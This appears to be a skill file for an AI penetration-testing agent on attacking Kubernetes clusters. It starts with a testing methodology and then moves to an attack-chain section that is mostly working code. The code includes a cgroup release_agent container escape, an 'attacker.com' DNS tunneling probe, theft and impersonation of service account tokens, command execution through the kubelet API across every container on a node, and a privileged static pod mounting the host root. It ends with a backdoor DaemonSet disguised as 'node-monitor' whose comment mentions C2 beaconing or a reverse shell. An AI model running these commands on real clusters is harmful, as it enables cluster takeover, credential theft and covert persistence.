---
name: kubernetes
description: Kubernetes cluster security testing - RBAC, API exposure, container escapes, network policies, secrets, and supply chain
---

# Kubernetes Security Testing

Kubernetes clusters expose a large attack surface through their API server, kubelet, etcd, and workload configurations. Misconfigurations in RBAC, network policies, and container security contexts are common and frequently lead to privilege escalation, lateral movement, and cluster takeover. This skill covers direct cluster access scenarios. For SSRF-mediated Kubernetes access, see the ssrf skill.

## Attack Surface

**Scope**
- Kubernetes API server (typically port 6443 or 443)
- Kubelet API (port 10250 authenticated, port 10255 deprecated read-only)
- etcd (port 2379/2380, stores all cluster state including secrets)
- Cloud provider metadata endpoints reachable from pods
- Container runtimes (containerd, CRI-O) via socket access
- Service mesh sidecars and ingress controllers

**Entry Points**
- Exposed API server with weak or anonymous authentication
- Compromised pod with mounted service account token
- CI/CD runner with cluster credentials (kubeconfig files, IRSA tokens)
- Exposed management UIs (Kubernetes Dashboard, Rancher, ArgoCD)
- Node-level access via SSH, cloud instance metadata, or container escape

**Authentication Methods**
- Service account tokens (mounted at `/var/run/secrets/kubernetes.io/serviceaccount/token`)
- Client certificates (kubeconfig files, often found in CI/CD configs, home dirs, cloud storage)
- OIDC tokens, webhook tokens, cloud provider IAM-to-K8s mappings (EKS IRSA, GKE Workload Identity)
- Anonymous access (enabled by default; unauthenticated requests become `system:anonymous` / `system:unauthenticated`, with only explicitly bound RBAC permissions such as public discovery/info roles)

## Key Vulnerabilities

### RBAC Misconfigurations

- Wildcard verbs or resources in ClusterRole/Role bindings: `verbs: ["*"]`, `resources: ["*"]`
- `cluster-admin` bound to service accounts that don't need it
- Pods running with `automountServiceAccountToken: true` (the default) when no API access is needed
- `system:anonymous` or `system:unauthenticated` group bound to permissive roles
- Roles that grant `escalate`, `bind`, or `impersonate` verbs

**Test:**
```
kubectl auth can-i --list
kubectl auth can-i create pods --as=system:serviceaccount:default:default
kubectl get clusterrolebindings -o json | jq '.items[] | select(.subjects[]?.name == "system:anonymous")'
```

### Exposed APIs

- API server with `--anonymous-auth=true` and permissive RBAC for anonymous users
- Kubelet read-only port 10255 serving `/pods`, `/spec`, `/stats`
- etcd without client certificate authentication: `etcdctl get / --prefix --keys-only`
- Kubernetes Dashboard with skip-login or default token
- Metrics endpoints (`/metrics`, `/debug/pprof`) leaking internal state

**Test:**
```
curl -sk https://<api-server>:6443/api/v1/namespaces
curl -s http://<node-ip>:10255/pods
curl -s http://<node-ip>:10255/metrics
```

### Container Escapes

- `privileged: true` in securityContext grants all Linux capabilities and device access
- `hostPID: true` enables `/proc` access to host processes, `nsenter` to host namespace
- `hostNetwork: true` places the pod on the host network stack
- Mounted Docker/containerd socket (`/var/run/docker.sock`, `/run/containerd/containerd.sock`)
- `CAP_SYS_ADMIN` + unconfined AppArmor enables mount namespace escapes via cgroup release_agent
- Writable `hostPath` mounts to `/`, `/etc`, or `/var/run`

**Test:**
```
# Check if running privileged
cat /proc/1/status | grep -i cap
# List host processes via hostPID
ls /proc/*/cmdline 2>/dev/null | head -20
# Check for mounted sockets
ls -la /var/run/docker.sock /run/containerd/containerd.sock 2>/dev/null
# cgroup v1 release_agent escape (privileged + CAP_SYS_ADMIN)
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
host_path=$(sed -n 's/.*upperdir=\([^,]*\).*/\1/p' /etc/mtab)
echo "$host_path/exploit.sh" > /tmp/cgrp/release_agent
echo '#!/bin/sh' > /exploit.sh && echo "ps aux > $host_path/out" >> /exploit.sh && chmod +x /exploit.sh
sh -c 'echo $$ > /tmp/cgrp/x/cgroup.procs'
```

### Network Policy Gaps

- No NetworkPolicy objects means all pod-to-pod traffic is allowed by default
- Egress policies missing, allowing pods to reach cloud metadata, external C2, or internal services
- Policies that select by namespace label but don't account for label-squatting
- DNS (port 53 UDP/TCP) often exempted from egress rules, enabling DNS tunneling

**Test:**
```
kubectl get networkpolicies --all-namespaces
# From inside a pod, test lateral reach
curl -s http://<other-pod-ip>:<port>/
curl -s http://169.254.169.254/latest/meta-data/
nslookup attacker.com
```

### Secret Management Issues

- Secrets stored as base64 in etcd (not encrypted at rest by default)
- Secrets injected via environment variables (visible in `/proc/*/environ`, `docker inspect`, crash dumps)
- ConfigMaps containing credentials, API keys, connection strings
- Service account tokens auto-mounted into pods that never call the API
- Helm release secrets containing full chart values with credentials

**Test:**
```
kubectl get secrets --all-namespaces -o json | jq '.items[].metadata.name'
kubectl get secret <name> -o json | jq '.data | map_values(@base64d)'
env | grep -iE 'password|key|token|secret|credential'
cat /var/run/secrets/kubernetes.io/serviceaccount/token
```

### Workload Misconfigurations

- Containers running as root (`runAsUser: 0` or no securityContext set)
- Missing `readOnlyRootFilesystem: true`
- No resource limits (enables resource exhaustion attacks, noisy neighbor DoS)
- `allowPrivilegeEscalation: true` (the default)
- Missing `seccompProfile` or AppArmor annotations

**Test:**
```
kubectl get pods -o json | jq '.items[].spec.containers[].securityContext'
kubectl get pods -o json | jq '.items[] | select(.spec.containers[].securityContext.privileged == true) | .metadata.name'
```

### Supply Chain Risks

- Images pulled from public registries without digest pinning (`:latest` tag is mutable)
- No image signing or admission policy (Kyverno, OPA Gatekeeper, Sigstore)
- Init containers or sidecar injectors pulling untrusted images
- Helm charts from unverified repos with post-install hooks
- CI/CD pipelines with broad cluster access and no image scanning

**Test:**
```
kubectl get pods -o json | jq '.items[].spec.containers[].image' | grep -v '@sha256'
kubectl get pods -o json | jq '.items[].spec.containers[].image' | grep ':latest'
```

## Bypass Techniques

**Token Reuse**
- Service account tokens from one pod can access any API object the SA has permissions for
- Tokens from CI/CD systems often have broad access (deploy, create, delete)
- Expired tokens may still work if token verification is misconfigured

**Label Manipulation**
- If RBAC or NetworkPolicy selects by label, and attacker can set labels on their pod, they can bypass restrictions
- Namespace labels used for admission control can be manipulated if attacker has `update` on namespaces

**Admission Webhook Bypass**
- Dry-run requests bypass mutating webhooks
- Some webhooks only check specific API groups, leaving others unprotected
- Webhook failures configured as `failurePolicy: Ignore` silently bypass validation

**Kubelet Direct Access**
- The kubelet API on port 10250 accepts commands independently from the API server
- If you can reach a node's kubelet, you can exec into any pod on that node
- Anonymous kubelet access: `curl -sk https://<node>:10250/runningpods/`

## Testing Methodology

1. **Enumerate access** - Determine current auth context: `kubectl auth whoami`, `kubectl auth can-i --list`
2. **Map the cluster** - List namespaces, pods, services, nodes, and their labels: `kubectl get all -A`
3. **Check RBAC** - Review ClusterRoleBindings and RoleBindings for overly permissive grants
4. **Probe APIs** - Test API server, kubelet, etcd, and dashboard reachability from your context
5. **Inspect workloads** - Check securityContext, hostPID/hostNetwork, volume mounts, and image tags
6. **Test network reach** - From compromised pod, probe other pods, services, metadata endpoints, and external hosts
7. **Extract secrets** - Enumerate secrets, env vars, mounted tokens, and Helm release values
8. **Escalate** - Chain findings: SA token + permissive RBAC -> create privileged pod -> node access -> cluster-admin
9. **Benchmark** - Run `kube-bench` for CIS compliance, `kubesec` for workload hardening scores, `trivy` for image CVEs

## Validation

1. Prove access to resources beyond intended scope (cross-namespace secret read, exec into another team's pod)
2. Demonstrate privilege escalation path from initial access to elevated permissions (SA token -> cluster-admin)
3. Show actual credential extraction (token, kubeconfig) and verify it grants claimed access level
4. For container escapes, demonstrate host filesystem read or host process visibility without destructive actions
5. Confirm NetworkPolicy gaps by showing successful cross-namespace or metadata endpoint connections

## False Positives

- `kubectl auth can-i` returning `yes` for service accounts that are restricted by admission controllers or OPA policies
- Kubelet port 10250 reachable but returning 401/403 (authentication is working correctly)
- NetworkPolicy absent in a namespace that uses a CNI with default-deny (Calico GlobalNetworkPolicy)
- Service account tokens mounted but unused, with admission controllers preventing their abuse
- Images using `:latest` tag but pulled from a private registry with immutable tags enabled

## Impact

- Full cluster compromise from a single misconfigured RBAC binding or service account
- Lateral movement across namespaces and workloads via pod-to-pod communication
- Cloud account compromise via metadata endpoint access from pods (AWS keys, GCP tokens, Azure MSI)
- Supply chain attacks via compromised base images or Helm chart hooks
- Data exfiltration from secrets, ConfigMaps, and persistent volumes
- Denial of service through resource exhaustion in clusters without resource quotas

## Pro Tips

1. Start with `kubectl auth can-i --list` to understand your blast radius before probing anything
2. Service account tokens in `/var/run/secrets/` are your first pivot point from any compromised pod
3. Test metadata endpoint access early - cloud credentials from pods are the fastest path to cluster-admin
4. Check for `kube-system` namespace access - controllers there often have cluster-admin equivalent permissions
5. `kube-bench` output is noisy but highlights the CIS benchmark failures that matter most
6. Container escapes via cgroup release_agent require `CAP_SYS_ADMIN` (via `privileged: true` or an explicit capability grant) plus permissive AppArmor/seccomp confinement
7. Helm release secrets (`sh.helm.release.v1.*`) in `kube-system` often contain credentials from chart values
8. DNS from inside a pod reveals service names: `dig +short SRV *.*.svc.cluster.local`
9. When testing RBAC, try `--as=` impersonation to check what other service accounts can do

## Summary

Kubernetes security failures typically chain: a single misconfigured role binding or missing network policy enables lateral movement, which leads to secret extraction, which leads to cloud credential access. Test the chain, not just individual findings. Start from the auth context you have, enumerate what it can reach, and escalate methodically.

## Attack-Chain Additions (in-cluster exploitation)

## Phase 2: Service Account Token Theft and Abuse

### Discovering Tokens

```bash
# Default service account token mount
cat /var/run/secrets/kubernetes.io/serviceaccount/token

# Projected service account tokens (newer clusters)
ls /var/run/secrets/kubernetes.io/serviceaccount/
# Files: token, ca.crt, namespace

# Search for tokens in environment variables and config files
env | grep -i token
find / -name "kubeconfig" -o -name ".kube" -o -name "config" 2>/dev/null
find / -name "*.kubeconfig" 2>/dev/null

# Check mounted secrets in other pods (if you can list or exec)
kubectl get pods -A -o jsonpath='{range .items[*]}{.metadata.namespace}/{.metadata.name}: {range .spec.volumes[*]}{.secret.secretName} {end}{"\n"}{end}'

# Look for tokens in etcd, configmaps, or environment variables
kubectl get secrets -A
kubectl get configmaps -A -o yaml | grep -i token
```

### Token Impersonation

```bash
# Use a stolen token to authenticate
kubectl --token="$STOLEN_TOKEN" --server="$APISERVER" \
  --certificate-authority="$CACERT" auth can-i --list

# Impersonate a service account (requires impersonate verb)
kubectl auth can-i impersonate serviceaccounts
kubectl --as=system:serviceaccount:kube-system:default get secrets -n kube-system

# Impersonate a user
kubectl --as=admin@example.com get pods -A

# Impersonate a group
kubectl --as-group=system:masters --as=dummy get secrets -A
```

---

## Phase 4: Kubelet API Exploitation

### Accessing Kubelet Directly

```bash
# Kubelet API runs on port 10250 (authenticated) and 10255 (read-only, deprecated)
# Scan for kubelet ports across cluster nodes

# Read-only port (10255) - no auth required if exposed
curl -s http://NODE_IP:10255/pods | python3 -m json.tool
curl -s http://NODE_IP:10255/spec/
curl -s http://NODE_IP:10255/metrics

# Authenticated port (10250) - requires valid credentials
# Use service account token or client certificate
curl -sk https://NODE_IP:10250/pods \
  -H "Authorization: Bearer ${TOKEN}"

# List running pods on the node
curl -sk https://NODE_IP:10250/runningpods/ \
  -H "Authorization: Bearer ${TOKEN}"
```

### Command Execution via Kubelet

```bash
# kubeletctl tool for kubelet API interaction
kubeletctl -s NODE_IP pods
kubeletctl -s NODE_IP scan rce

# Execute commands in pods via kubelet API directly (bypasses API server RBAC)
curl -sk https://NODE_IP:10250/run/NAMESPACE/POD_NAME/CONTAINER_NAME \
  -H "Authorization: Bearer ${TOKEN}" \
  -d "cmd=id"

# Execute in every container on the node
curl -sk https://NODE_IP:10250/runningpods/ \
  -H "Authorization: Bearer ${TOKEN}" | \
  python3 -c "
import json,sys
pods=json.load(sys.stdin)
for pod in pods.get('items',[]):
    ns=pod['metadata']['namespace']
    name=pod['metadata']['name']
    for c in pod['spec'].get('containers',[]):
        print(f'{ns}/{name}/{c[\"name\"]}')
"
# Then exec into each one to extract tokens and secrets

# Retrieve container logs
curl -sk "https://NODE_IP:10250/containerLogs/NAMESPACE/POD/CONTAINER" \
  -H "Authorization: Bearer ${TOKEN}"
```

---

## Phase 8: Admission Controller Bypass and Persistence

### Bypassing Admission Controllers

```bash
# Check which admission controllers are active
kubectl get validatingwebhookconfigurations
kubectl get mutatingwebhookconfigurations

# Inspect webhook configuration for bypass opportunities
kubectl get validatingwebhookconfigurations -o json | python3 -c "
import json,sys
data=json.load(sys.stdin)
for wh in data['items']:
    name=wh['metadata']['name']
    for w in wh.get('webhooks',[]):
        ns_selector=w.get('namespaceSelector',{})
        obj_selector=w.get('objectSelector',{})
        failure=w.get('failurePolicy','Fail')
        print(f'{name}/{w[\"name\"]}: failurePolicy={failure}')
        if ns_selector:
            print(f'  namespaceSelector: {json.dumps(ns_selector)}')
        if failure == 'Ignore':
            print(f'  BYPASS: failurePolicy=Ignore - webhook failures are ignored')
"

# If failurePolicy is Ignore, you can create resources when webhook is down
# If namespaceSelector excludes certain namespaces, deploy there

# Deploy to kube-system (often excluded from admission policies)
kubectl run pwn --image=alpine -n kube-system -- sleep 3600

# Use static pods (bypass API server admission entirely)
# Write manifest to /etc/kubernetes/manifests/ on a node
cat > /host/etc/kubernetes/manifests/pwn.yaml << 'EOF'
apiVersion: v1
kind: Pod
metadata:
  name: pwn-static
  namespace: kube-system
spec:
  hostPID: true
  hostNetwork: true
  containers:
  - name: pwn
    image: alpine
    command: ["sleep", "3600"]
    securityContext:
      privileged: true
    volumeMounts:
    - name: root
      mountPath: /host
  volumes:
  - name: root
    hostPath:
      path: /
EOF
```

### CRD and Operator Abuse

```bash
# List custom resource definitions
kubectl get crds

# Check for operators with elevated privileges
kubectl get deployments -A -o json | python3 -c "
import json,sys
data=json.load(sys.stdin)
for d in data['items']:
    name=d['metadata']['name']
    ns=d['metadata']['namespace']
    sa=d['spec']['template']['spec'].get('serviceAccountName','default')
    if any(x in name.lower() for x in ['operator','controller','manager']):
        print(f'{ns}/{name} (SA: {sa})')
"

# If you can create CRDs, install a backdoor operator
# If you can modify existing CRs, inject malicious configurations
# Example: modify a CR that triggers pod creation with your image
```

### Persistence via DaemonSet

```bash
# Deploy a DaemonSet that runs on every node
cat <<'EOF' | kubectl apply -f -
apiVersion: apps/v1
kind: DaemonSet
metadata:
  name: node-monitor
  namespace: kube-system
  labels:
    app: node-monitor
spec:
  selector:
    matchLabels:
      app: node-monitor
  template:
    metadata:
      labels:
        app: node-monitor
    spec:
      hostPID: true
      hostNetwork: true
      tolerations:
      - operator: Exists
      containers:
      - name: monitor
        image: alpine
        command: ["/bin/sh", "-c"]
        args:
        - |
          while true; do
            # Beacon to C2 or maintain reverse shell
            sleep 3600
          done
        securityContext:
          privileged: true
        volumeMounts:
        - name: host
          mountPath: /host
      volumes:
      - name: host
        hostPath:
          path: /
EOF
```

---
